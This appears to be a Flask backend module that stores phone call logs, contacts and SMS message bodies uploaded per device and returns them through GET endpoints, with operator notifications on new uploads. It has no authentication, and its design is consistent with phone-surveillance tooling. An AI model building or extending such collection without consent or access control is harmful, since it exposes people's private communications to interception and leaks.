from flask import Blueprint, request, jsonify
from datetime import datetime
from sqlalchemy.exc import SQLAlchemyError
from models.devices import Device, CallLog, Contact, SMSMessage, DeviceNotification
from config.database import db
import json
from logzero import logger

communication_bp = Blueprint('communication', __name__)


def _create_notification(device_id, event_type, message):
    try:
        notif = DeviceNotification(device_id=device_id, event_type=event_type, message=message)
        db.session.add(notif)
        db.session.commit()
    except Exception as e:
        logger.error(f"Failed to create notification: {e}")
        db.session.rollback()


@communication_bp.route('/call-logs', methods=['POST'])
def save_call_logs():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        call_logs = data.get('callLogs', [])

        if not device_id or not call_logs:
            return jsonify({'error': 'Missing device ID or call logs data'}), 400

        # Delete existing call logs for this device
        CallLog.query.filter_by(device_id=device_id).delete()

        for call in call_logs['calls']:
            # from Sat Apr 05 12:50:47 GMT+05:30 2025' to 20 March 2024 12:00:00 PM
            timestamp = datetime.strptime(
                call.get('date'), "%a %b %d %H:%M:%S %Z%z %Y")
            # print(timestamp.strftime("%d %B %Y %I:%M:%S %p"))
            call_log = CallLog(
                device_id=device_id,
                phone_number=call.get('number'),
                contact_name=call.get('name'),
                call_type=call.get('type'),
                duration=call.get('duration'),
                timestamp=timestamp
            )
            db.session.add(call_log)

        db.session.commit()
        _create_notification(device_id, 'new_call', f'New call logs received from device {device_id[:8]}')
        return jsonify({'message': 'Call logs saved successfully'}), 200

    except SQLAlchemyError as e:
        logger.error(
            f"Error saving call logs for device {device_id}: {str(e)}")
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@communication_bp.route('/contacts', methods=['POST'])
def save_contacts():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        contacts = data.get('contacts', [])
        print(contacts, device_id)
        if not device_id or not contacts:
            return jsonify({'error': 'Missing device ID or contacts data'}), 400

        # Delete existing contacts for this device
        Contact.query.filter_by(device_id=device_id).delete()

        for contact in contacts['contacts']:

            contact_info = Contact(
                device_id=device_id,
                name=contact.get('name'),
                phone_numbers=contact.get('number'),
                last_updated=datetime.now()
            )
            db.session.add(contact_info)

        db.session.commit()
        return jsonify({'message': 'Contacts saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@communication_bp.route('/sms-messages', methods=['POST'])
def save_sms_messages():
    try:
        data = request.get_json()
        device_id = data.get('deviceId')
        messages = data.get('smsMessages', [])

        if not device_id or not messages:
            return jsonify({'error': 'Missing device ID or SMS messages data'}), 400

        # Delete existing SMS messages for this device
        SMSMessage.query.filter_by(device_id=device_id).delete()

        for message in messages['messages']:
            timestamp = datetime.strptime(message.get(
                'date'), "%a %b %d %H:%M:%S %Z%z %Y")
            sms = SMSMessage(
                device_id=device_id,
                phone_number=message.get('address'),
                contact_name=message.get('contactName'),
                message_type=message.get('type'),
                message_body=message.get('body'),
                timestamp=timestamp
            )
            db.session.add(sms)

        db.session.commit()
        _create_notification(device_id, 'new_sms', f'New SMS messages received from device {device_id[:8]}')
        return jsonify({'message': 'SMS messages saved successfully'}), 200

    except SQLAlchemyError as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500


@communication_bp.route('/device/<device_id>/call-logs', methods=['GET'])
def get_device_call_logs(device_id):
    try:
        call_logs = CallLog.query.filter_by(device_id=device_id)\
            .order_by(CallLog.timestamp.desc()).all()
        return jsonify([log.to_dict() for log in call_logs]), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@communication_bp.route('/device/<device_id>/contacts', methods=['GET'])
def get_device_contacts(device_id):
    try:
        contacts = Contact.query.filter_by(device_id=device_id)\
            .order_by(Contact.name).all()
        return jsonify([contact.to_dict() for contact in contacts]), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500


@communication_bp.route('/device/<device_id>/sms', methods=['GET'])
def get_device_sms(device_id):
    try:
        messages = SMSMessage.query.filter_by(device_id=device_id)\
            .order_by(SMSMessage.timestamp.desc()).all()
        return jsonify([message.to_dict() for message in messages]), 200

    except SQLAlchemyError as e:
        return jsonify({'error': str(e)}), 500
